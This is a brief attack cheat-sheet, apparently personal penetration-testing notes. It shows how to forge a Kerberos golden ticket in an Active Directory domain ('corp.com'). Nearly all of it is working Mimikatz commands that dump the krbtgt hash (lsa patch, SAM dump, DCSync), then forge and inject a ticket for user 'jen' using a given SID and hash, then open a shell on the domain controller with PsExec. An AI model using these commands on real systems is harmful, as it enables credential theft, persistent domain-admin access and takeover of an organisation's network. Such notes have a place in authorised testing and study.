This ticket is craftable after we obtain the hash of krbtgt

# Geting krbtgt hash
```bash
# Mimikatz
privilege::debug
lsadump::lsa /patch

lsadump::sam

lsadump::dcsync 
```

-----------------------

# Craft ticket and use
```bash
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

misc::cmd

PsExec.exe \\dc1 cmd.exe
```
